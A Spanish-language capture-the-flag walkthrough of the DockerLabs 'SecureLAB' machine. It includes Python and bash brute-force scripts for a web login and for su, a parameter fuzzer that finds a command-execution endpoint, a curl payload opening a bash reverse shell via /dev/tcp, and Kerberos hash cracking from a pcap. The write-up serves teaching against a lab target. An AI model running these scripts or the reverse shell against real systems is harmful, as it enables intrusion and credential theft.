---
icon: flag
---

# CTF SecureLAB Hard

URL Download CTF =[ https://drive.google.com/file/d/1Egn3NKBBF8eRtGG9xMpcb-LnzwgCb6pH/view?usp=sharing](https://drive.google.com/file/d/1Egn3NKBBF8eRtGG9xMpcb-LnzwgCb6pH/view?usp=sharing)

## Instalación

Cuando obtenemos el `.zip` nos lo pasamos al entorno en el que vamos a empezar a hackear la maquina y haremos lo siguiente.

```shell
unzip secureLAB.zip
```

Nos lo descomprimira y despues montamos la maquina de la siguiente forma.

```shell
bash auto_mount.sh securelab.tar
```

Info:

```
___________________¶¶
____________________¶¶__¶_5¶¶
____________5¶5__¶5__¶¶_5¶__¶¶¶5
__________5¶¶¶__¶¶5¶¶¶¶¶5¶¶__5¶¶¶5
_________¶¶¶¶__¶5¶¶¶¶¶¶¶¶¶¶¶__5¶¶¶¶5
_______5¶¶¶¶__¶¶¶¶¶¶¶¶¶¶¶_5¶¶__5¶¶¶¶¶5
______¶¶¶¶¶5_¶¶¶¶¶¶¶¶¶¶¶¶¶5¶¶¶__¶¶¶¶5¶5
_____¶¶¶¶¶¶_¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶_¶¶¶¶¶¶¶5
____¶¶¶¶¶¶¶_¶¶¶5¶¶¶¶5_¶¶¶¶¶5_5¶_¶¶¶¶¶¶¶¶5
___¶¶¶¶¶¶¶¶__5¶¶¶¶¶¶5___5¶¶¶¶__5¶¶¶¶¶¶¶¶¶5
__¶¶¶¶¶¶¶¶¶¶5__5¶¶¶¶¶¶5__5¶¶5_5¶¶¶¶¶¶¶¶¶¶¶
_5¶¶¶¶¶¶¶¶¶¶¶¶_5¶¶¶¶¶¶¶¶¶5__5¶¶¶¶¶¶¶¶¶¶¶¶¶5
_¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶_5¶¶¶¶
5¶¶¶¶¶¶¶¶¶¶¶¶5___5¶¶¶¶¶¶¶5__¶¶¶¶5_¶¶¶5_¶¶¶¶
¶¶¶¶¶¶¶¶_¶¶5_5¶5__¶¶¶¶¶¶¶¶¶5_5¶¶¶_5¶¶¶_5¶¶¶5
¶5¶¶¶¶¶5_¶¶_5¶¶¶¶¶_¶¶¶¶¶¶¶¶¶¶5_5¶¶_5¶¶¶_¶¶¶5
¶¶¶¶_¶¶__¶__¶¶¶¶¶¶5_5¶¶¶¶¶¶¶¶¶¶5_¶¶_5¶¶_5¶¶¶
¶¶¶5_5¶______5¶¶5¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶5_¶¶_5¶5_¶5¶
5¶¶____5¶¶¶¶5_____5¶¶¶¶¶¶¶5_¶¶¶¶¶5_¶__¶¶_5¶¶
_¶¶__5¶¶¶¶¶¶¶¶¶¶5____5¶¶¶¶¶¶_¶¶¶¶¶_____¶5_¶¶
_¶¶___5¶¶¶¶¶¶¶¶¶__________5¶5_¶¶¶¶¶____¶¶_¶¶
_¶¶_______5¶¶¶¶¶¶5____________¶¶¶¶¶_____¶_¶¶
_5¶5________5¶¶_¶¶¶¶5________5¶¶¶¶¶_______¶¶
__¶¶__________¶___¶¶¶¶¶5___5¶¶¶¶¶¶5_______¶5
__¶¶____________5¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶________¶
___¶________________5¶¶¶¶¶¶¶¶5_¶¶
___¶__________5¶¶¶¶¶¶¶¶5¶¶¶5__5¶5
_____________________5¶¶¶5____¶5

                                           
 ##   ##    ##       ####   ###  ##  #######  ######   ####       ##     ######    #####  
 ##   ##   ####     ##  ##   ##  ##   ##   #   ##  ##   ##       ####     ##  ##  ##   ## 
 ##   ##  ##  ##   ##        ## ##    ## #     ##  ##   ##      ##  ##    ##  ##  #       
 #######  ##  ##   ##        ####     ####     #####    ##      ##  ##    #####    #####  
 ##   ##  ######   ##        ## ##    ## #     ## ##    ##   #  ######    ##  ##       ## 
 ##   ##  ##  ##    ##  ##   ##  ##   ##   #   ##  ##   ##  ##  ##  ##    ##  ##  ##   ## 
 ##   ##  ##  ##     ####   ###  ##  #######  #### ##  #######  ##  ##   ######    #####  
                                         

Estamos desplegando la máquina vulnerable, espere un momento.

Máquina desplegada, su dirección IP es --> 172.17.0.2

Presiona Ctrl+C cuando termines con la máquina para eliminarla
```

Por lo que cuando terminemos de hackearla, le damos a `Ctrl+C` y nos eliminara la maquina para que no se queden archivos basura.

### Escaneo de puertos

```shell
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn <IP>
```

```shell
nmap -sCV -p<PORTS> <IP>
```

Info:

```
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-03-06 07:21 EST
Nmap scan report for 172.17.0.2
Host is up (0.000070s latency).

PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.58 ((Ubuntu))
|_http-server-header: Apache/2.4.58 (Ubuntu)
|_http-title: 403 Forbidden
MAC Address: 02:42:AC:11:00:02 (Unknown)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 6.68 seconds
```

Vemos que hay un puerto `80` abierto, si entramos a el, veremos una pagina normal aparentemente, pero podemos descargarnos un binario en la parte que pone `Descargar MatrixCloud`, pero si lo ejecutamos veremos que es un binario simple y normal, nada fuera de lo normal, lo que si me atrae es el nombre que tiene puesto `matrix`, vamos a probar si fuera el nombre de algun directorio en la web o de algun archivo `.html, .php, etc...`

Si probamos a poner lo siguiente:

```
URL = http://<IP>/matrix.php
```

Veremos que si nos funciona, veremos una lluvia de codigo en la pagina, lo malo es que no podremos inspeccionar nada, ni utilizar `curl` o `wget` para traernos el archivo de la pagina, ni nada de eso para ver su codigo fuente, pero si esperamos un poco, podremos ver que se nos va resaltando palabras en un tono mas anaranjado formando una especie de palabra.

Despues de un rato de analizar esa secuencia de palabras, me da como resultado la siguiente frase:

```
secure-api-register
```

Tambien podremos capturar la respuesta del servidor mediante `BurpSuite` y obtener el codigo fuente para poder ver el `JavaScript` y obtener la palabra.

Teniendo esta palabra, podemos deducir que puede ser de un dominio, le añadiremos un `.dl` al final ya que esta subido en `Dockerlabs`.

```shell
nano /etc/hosts

#Dentro del nano
<IP>               secure-api-register.dl
```

Lo guardamos y entramos mediante ese dominio.

```
URL = http://secure-api-register.dl/
```

Veremos un login respecto a una `API` en la nube, pero las credenciales por defecto no nos van a funciona, si nosotros probamos a meter como usuario `admin` y como contraseña tendremos que realizar fuerza bruta de la siguiente forma:

> brutePass.py

```python
import subprocess
import sys

def brute_force(url, username, wordlist):
    try:
        with open(wordlist, "r", encoding="utf-8") as file:
            for password in file:
                password = password.strip()
                print(f"[*] Probando: {password}")

                # Construir el comando curl
                cmd = [
                    "curl", "-X", "POST", url,
                    "-H", "Content-Type: application/json",
                    "-d", f'{{"username": "{username}", "password": "{password}"}}',
                    "-c", "cookie.txt"
                ]

                # Ejecutar el comando y capturar la salida
                result = subprocess.run(cmd, capture_output=True, text=True)
                
                # Revisar la respuesta
                if '{"message":"Invalid credentials"}' not in result.stdout:
                    print(f"[+] Credenciales válidas encontradas: {username}:{password}")
                    break  # Terminar si encuentra una credencial válida
            else:
                print("[-] No se encontraron credenciales válidas.")
    except FileNotFoundError:
        print(f"[!] No se pudo abrir el archivo: {wordlist}")
    except Exception as e:
        print(f"[!] Error: {e}")

if __name__ == "__main__":
    if len(sys.argv) != 2:
        print("Uso: python3 script.py <wordlist.txt>")
    else:
        url = "http://secure-api-register.dl/login"
        username = "admin"
        wordlist = sys.argv[1]
        brute_force(url, username, wordlist)
```

Lo ejecutaremos de la siguiente forma:

```shell
python3 brutePass.py <WORDLIST>
```

Info:

```
.................................................................................
[*] Probando: julian
[*] Probando: travis
[*] Probando: myspace1
[*] Probando: babyblue
[*] Probando: sabrina
[*] Probando: michael1
[*] Probando: jeffrey
[*] Probando: stephen
[*] Probando: love
[+] Credenciales válidas encontradas: admin:love
```

Veremos que nos saco la contraseña`love`, si lo probamos en la web entraremos a un panel de administrador, pero que aparentemente no veremos nada en especial.

## Curl

Vamos a probar a utilizar `curl` enviando esa peticion de la misma forma, pero con otro tipo de respuesta para intentar interactuar directamente mediante `curl` de la siguiente forma:

```shell
curl -X POST http://secure-api-register.dl/login \  
    -H "Content-Type: application/json" \
    -d '{"username": "admin", "password": "love"}'
```

Info:

```
<!doctype html>
<html lang=en>
<title>Redirecting...</title>
<h1>Redirecting...</h1>
<p>You should be redirected automatically to the target URL: <a href="/admin">/admin</a>. If not, click the link.
```

Nos pondra que nos esta redireccionando al panel de admin, pero no nos sirve de mucho, si probamos a volcar esta informacion que nos esta proporcionando a un archivo `.txt` para ver que vemos de la siguiente forma:

```shell
curl -X POST http://secure-api-register.dl/login \  
    -H "Content-Type: application/json" \
    -d '{"username": "admin", "password": "love"}' \
    -c cookie.txt
```

Info:

```
<!doctype html>
<html lang=en>
<title>Redirecting...</title>
<h1>Redirecting...</h1>
<p>You should be redirected automatically to the target URL: <a href="/admin">/admin</a>. If not, click the link.
```

Ahora si leemos nuestro archivo `.txt` veremos lo siguiente:

```
# Netscape HTTP Cookie File
# https://curl.se/docs/http-cookies.html
# This file was generated by libcurl! Edit at your own risk.

#HttpOnly_secure-api-register.dl        FALSE   /       FALSE   0       session eyJsb2dnZWRfaW4iOnRydWV9.Z8mZWQ.Mea36qHN-RiJ3yRKH9dY88gAFV8
```

Vemos que nos esta volcando una `Cookie`, ahora que tenemos una posible `cookie` de sesion, vamos a investigar mas por los directorio.

Si nos vamos al famosos archivo llamado `robots.txt` pero de la `IP` de la pagina principal veremos lo siguiente:

```
User-agent: * 

Disallow: /execute
Disallow: /admin
Disallow: /secret
```

Vemos que hay un parametro interesante llamado `execute`, si entramos dentro desde la web veremos que el metodo no es el correcto:

```
Method Not Allowed

The method is not allowed for the requested URL.
```

Por lo que vamos a hacerlo desde `curl` vimos antes que obtuvimos una `cookie`, vamos a utilizarla para este parametro de `URL` podemos deducir que sirve para ejecutar algo, pero no sabemos el parametro en concreto, por lo que vamos a realizar fuerza bruta con un script casero.

La estructura del comando seria algo asi:

```shell
curl -X POST http://secure-api-register.dl/execute \
    -H "Content-Type: application/json" \
    -d '{"<FUZZ>": "whoami"}' \                     
    -b cookie.txt
```

> findParamAPICommand.py

```python
import subprocess
import argparse

# Función para realizar la solicitud de prueba
def brute_force(url, cookie_file, wordlist):
    # Abrimos el archivo de cookies
    with open(cookie_file, 'r') as f:
        cookies = f.read().strip()

    # Leer el archivo wordlist con manejo de errores en la codificación
    with open(wordlist, 'r', encoding='utf-8', errors='ignore') as f:
        words = f.readlines()

    # Limpiar las palabras del diccionario
    words = [word.strip() for word in words]

    # Contador de intentos
    attempt_counter = 0

    # Intentar con cada palabra del diccionario
    for word in words:
        attempt_counter += 1  # Incrementar el contador de intentos

        # Construir el comando curl dinámicamente
        curl_command = [
            "curl", "-X", "POST", url,
            "-H", "Content-Type: application/json",
            "-d", f'{{"{word}": "whoami"}}',  # Reemplaza <FUZZ> por la palabra actual
            "-b", cookie_file
        ]

        # Ejecutar el comando curl
        response = subprocess.run(curl_command, capture_output=True, text=True)

        # Verificar si la respuesta contiene el resultado esperado
        if "result" in response.stdout:
            print(f"\nSuccess! Parameter: {word}, Response: {response.stdout}")
            break  # Si encuentra el parámetro correcto, se detiene el proceso

        # Muestra el contador de intentos en la misma línea
        if attempt_counter % 10 == 0:
            print(f"\rAttempted {attempt_counter} commands...", end='', flush=True)

# Función principal para manejar los parámetros de línea de comandos
def main():
    parser = argparse.ArgumentParser(description="Fuerza bruta para encontrar el parámetro correcto en el JSON.")
    parser.add_argument("-u", "--url", required=True, help="URL de la API para probar")
    parser.add_argument("-c", "--cookie", required=True, help="Ruta al archivo de cookies")
    parser.add_argument("-w", "--wordlist", required=True, help="Ruta al archivo de diccionario de palabras")
    args = parser.parse_args()

    brute_force(args.url, args.cookie, args.wordlist)

if __name__ == "__main__":
    main()
```

Lo ejecutaremos de la siguiente forma:

```shell
python3 findParamAPICommand.py -u http://secure-api-register.dl/execute -c cookie.txt -w <WORDLIST>
```

Info:

```
Attempted 18120 commands...
Success! Parameter: command, Response: {"result":"www-data\n"}
```

Veremos que encontramos que el parametro es `command` por lo que haremos lo siguiente:

```shell
curl -X POST http://secure-api-register.dl/execute \
    -H "Content-Type: application/json" \
    -d '{"command": "whoami"}' \                     
    -b cookie.txt
```

Info:

```
{"result":"www-data\n"}
```

Veremos que el resultado es positivo y que nos ejecuta el comando de forma correcta, por lo que vamos a probar a generarnos una `reverse shell`.

```shell
curl -X POST http://secure-api-register.dl/execute \
    -H "Content-Type: application/json" \
    -d '{"command": "bash -c \"bash -i >& /dev/tcp/<IP>/<PORT> 0>&1\""}' \
    -b cookie.txt
```

Antes de ejecutarlo nos pondremos a la escucha de la siguiente forma:

```shell
nc -lvnp <PORT>
```

Y si ejecutamos el comando anterior y volvemos a donde tenemos la escucha, veremos lo siguiente:

```
listening on [any] 7777 ...
connect to [192.168.5.186] from (UNKNOWN) [172.17.0.2] 38296
bash: cannot set terminal process group (24): Inappropriate ioctl for device
bash: no job control in this shell
www-data@dockerlabs:/$ whoami
whoami
www-data
```

Vemos que entramos como el usuario `www-data`, por lo que tendremos que sanitizar la shell.

### Sanitización de shell (TTY)

```shell
script /dev/null -c bash
```

```shell
# <Ctrl> + <z>
stty raw -echo; fg
reset xterm
export TERM=xterm
export SHELL=/bin/bash

# Para ver las dimensiones de nuestra consola en el Host
stty size

# Para redimensionar la consola ajustando los parametros adecuados
stty rows <ROWS> columns <COLUMNS>
```

## Escalate user administrator

Si nos vamos a la siguiente ruta veremos lo siguiente:

```shell
cd /var/www
ls -la
```

Info:

```
drwxr-xr-x 2 root     root     4096 Mar  5 13:45 analisys
drwxr-xr-x 1 www-data www-data 4096 Mar  6 14:04 html
drwxr-xr-x 1 www-data www-data 4096 Mar  6 14:06 secure-api-register.dl
```

Vemos que hay una carpeta bastante interesante llamada `analisys`, si entramos dentro veremos `2` archivos uno de ellos sera un `traficDetect.pcap` y el otro sera `note.txt`, si leemos la nota veremos lo siguiente:

```
Aqui os dejo el .pcap para que lo analiceis, yo estuve trabajando en ello y se que tenemos que descubrir una autenticacion que se ha realizado
en alguna parte del trafico de red, teniendo eso creo que podremos descubrir la contraseña que tiene nuestra cuenta de Administrator.

NOTA:

Solo he descubierto que lo que obtengamos en esa contraseña que encontremos tenemos que añadirle una palabra delante con un diccionario de palabras
todo junto, con eso habremos formado bien la contraseña para la cuenta de Administrator.
```

Vemos que estaba en proceso de sacar unas credenciales del `.pcap` que servirian para el usuario `administrator`, por lo que vamos a investigar que tiene ese `.pcap` pasandonoslo al `host`.

```shell
python3 -m http.server
```

> Host

```shell
wget http://<IP>:8000/traficDetect.pcap
```

Una vez que nos lo hayamos pasado lo abriremos y veremos muchisimo trafico de red y como sabemos que tenemos que encontrar alguna autenticacion vemos que hay una autenticacion por `kerberos`, que se ha realizado un `TGS` y un `TGT`, por lo que vamos a probar a `crackear` la contraseña de dicha autenticacion, para ello tendremos que obtener varios componentes de la siguiente forma.

Primero filtramos el trafico por `kerberos`, despues vamos a ver bajo que usuario se encuentra dicha autenticacion:

<figure><img src="../../.gitbook/assets/image (298).png" alt=""><figcaption></figcaption></figure>

Con el `cname` podemos ver a que usuario pertenece, en este caso a `empleado1` por lo que nos guardaremos el nombre.

Ahora vamos a ver los datos del `AS-REQ` que envia la IP del `empleado1` al servidor `DC` del dominio, que en este caso el valor con el que nos tenemos que quedar es con el de `cipher` que sera el `hash` que utilizaremos para formar el `hash` del `kerberos`.

<figure><img src="../../.gitbook/assets/image (299).png" alt=""><figcaption></figcaption></figure>

Ahora tenemos que ver la respuesta en este caso el `AS-REP` que le responde el servidor `DC` al usuario `empleado1` mediante una serie de pasos de autenticacion con el usuario `krbtgt`, por lo que nos quedaremos con el `salt` que hace falta para el `hash` de `kerberos` en este caso `CORP.LOCALempleado1` y mas abajo vemos bajo que dominio(`bosque`) se encuentre que sera `CORP.LOCAL`.

<figure><img src="../../.gitbook/assets/image (300).png" alt=""><figcaption></figcaption></figure>

Teniendo todo esto, tendremos que formar el `hash` para que sea uno valido de `kerberos` que tendra la siguiente estructura.

> Hash Kerberos (Estructura)

```
$krb5pa$18$<USER>$<DOMAIN>$<SALT>$<HASH_CIPHER>
```

Ahora con todos los datos vamos a formar nuestro `hash` quedando de la siguiente forma:

> hash

```
$krb5pa$18$empleado1$CORP.LOCAL$CORP.LOCALempleado1$cdd51e61aafb2b409e65ade3c748a18a85b02f3c6ebfbba42004e9669279104aef7d20d49ac73046cf1093063c3e74b2c5558d33e5521d3c
```

Ahora se lo vamos a pasar a `john` para que lo `cracke`.

### Crack Hash Kerberos

```shell
john --wordlist=<WORDLIST> hash
```

Info:

```
Warning: detected hash type "krb5pa-sha1", but the string is also recognized as "HMAC-SHA256"
Use the "--format=HMAC-SHA256" option to force loading these as that type instead
Warning: detected hash type "krb5pa-sha1", but the string is also recognized as "HMAC-SHA512"
Use the "--format=HMAC-SHA512" option to force loading these as that type instead
Using default input encoding: UTF-8
Loaded 1 password hash (krb5pa-sha1, Kerberos 5 AS-REQ Pre-Auth etype 17/18 [PBKDF2-SHA1 128/128 AVX 4x])
Will run 8 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
Passw0rd2        (?)     
1g 0:00:18:21 DONE (2025-03-05 07:26) 0.000907g/s 9743p/s 9743c/s 9743C/s Passwordas..Parade2
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```

Despues de unos `18` minutos, veremos que nos saca la contraseña que sera `Passw0rd2`, ahora le tendremos que añadir lo que nos menciono la nota anteriormente pero para descubrir dicha contraseña, tendremos que probar fuerza bruta creandonos un script de la siguiente forma:

> suBruteforceUpdate.sh

```bash
#!/bin/bash

mostrar_ayuda() {
    echo -e "\e[1;33mUso: $0 [user] [diccionario]"
    echo -e "\e[1;31mEspecifica el nombre de usuario y el archivo de diccionario (wordlist)\e[0m"
    echo -e "\e[1;33m==================================="
    echo -e "\e[1;33mEjemplo de uso: \n"
    echo -e "./$0 user wordlist.txt\e[0m"
    echo -e "\e[1;33m===================================\e[0m"
    exit 1
}

imprimir_banner() {
    echo -e "\e[1;34m"
    echo "***************************"
    echo "*       suBruteforce      *"
    echo "*        d1se0 v2.0       *"
    echo "***************************"
    echo -e "\e[0m"
}

finalizar() {
    echo -e "\e[1;31m\nFinalizando el script\e[0m"
    exit
}

trap finalizar SIGINT

usuario=$1
diccionario=$2

if [[ $# != 2 ]]; then
    mostrar_ayuda
fi

imprimir_banner

while IFS= read -r password; do
    if [[ "$(whoami)" == "$usuario" ]]; then
        echo -e "\e[1;33m[!] Ya eres el usuario $usuario, no es necesario realizar fuerza bruta.\n\e[0m"
        break
    fi

    modificado="Passw0rd2$password"
    echo -e "\e[1;31m[-] Probando $usuario:$modificado\e[0m"

    if timeout 0.1 bash -c "echo $modificado | su $usuario -c 'echo HELLO'" > /dev/null 2>&1; then
        clear
        echo -e "\e[1;32m[+] Contraseña encontrada para el usuario $usuario:$modificado\e[0m"
        break
    fi
done < "$diccionario"
```

Lo que vamos hacer es utilizar la palabra `Passw0rd2` delante de las palabras del diccionario que pongamos, lo ejecutaremos de la siguiente forma:

```shell
bash suBruteforceUpdate.sh administrator <WORDLIST>
```

Info:

```
[+] Contraseña encontrada para el usuario administrator:Passw0rd2kitty1
```

Como resultado vemos que la contraseña es:

```
Passw0rd2kitty1
```

Si esto lo probamos para el usuario `Administrator` veremos que funciona.

```shell
su administrator
```

Metemos como contraseña `Passw0rd2kitty1` y veremos que estamos dentro, por lo que leeremos la flag del usuario.

> user.txt

```
1be10a286d4effa0df103518e39ea316
```

## Escalate Privileges

Si hacemos `sudo -l` veremos lo siguiente:

```
Matching Defaults entries for administrator on dockerlabs:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
    use_pty

User administrator may run the following commands on dockerlabs:
    (ALL : ALL) /usr/bin/find
```

Por lo que vemos podemos ejecutar como `root` el binario `find`, pero si nos vamos a `GTFOBins` y buscamos la escala del binario no aparecera algo asi:

```shell
sudo find . -exec /bin/sh \; -quit
```

Pero esto no va a funcionar y podemos deducir que es un binario modificado, por lo que no es el original, vamos a realizarle ingenieria inversa para ver que contiene.

### Ghidra

Abriremos `ghidra` y cargaremos el binario pero antes nos lo tendremos que pasar.

> Maquina victima

```shell
cd /usr/bin
python3 -m http.server
```

> Host

```shell
wget http://<IP>:8000/find
```

Una vez que hayamos cargado el binario en la herramienta veremos una funcion bastante interesante en el apartado de funciones llamada `find_callback`:

```c
undefined8 find_callback(char *param_1,long param_2,int param_3)

{
  char *__s2;
  int iVar1;
  char *__s1;
  
  __s2 = target_name;
  if (target_name == (char *)0x0) {
    __xpg_basename(param_1);
  }
  else {
    iVar1 = strcmp(target_name,"leersecretpassroot");
    if (iVar1 == 0) {
      system("cat /root/pass.txt");
                    /* WARNING: Subroutine does not return */
      exit(0);
    }
    __s1 = __xpg_basename(param_1);
    iVar1 = strcmp(__s1,__s2);
    if (iVar1 != 0) {
      return 0;
    }
  }
  if (target_type != '\0') {
    if (target_type == 'f') {
      if (param_3 != 0) {
        return 0;
      }
    }
    else if ((target_type == 'd') && (param_3 != 1)) {
      return 0;
    }
  }
  if ((target_uid != -1) && (target_uid != *(int *)(param_2 + 0x1c))) {
    return 0;
  }
  puts(param_1);
  return 0;
}
```

Vemos que si buscamos por la palabra `leersecretpassroot` llamara a la funcion de leer un `.txt` en la carpeta de `root`, por lo que tendremos que hacer lo siguiente en la maquina victima:

```shell
sudo find / -name "leersecretpassroot" 2>/dev/null
```

Info:

```
root:rootpasswordsupersecret
```

Y si ahora hacemos lo siguiente:

```shell
su root
```

Metemos como contraseña `rootpasswordsupersecret` y veremos que seremos `root`, por lo que leeremos la flag de `root`.

> root.txt

```
9866b73304dbe02c58a9ac37ec4c185d
```
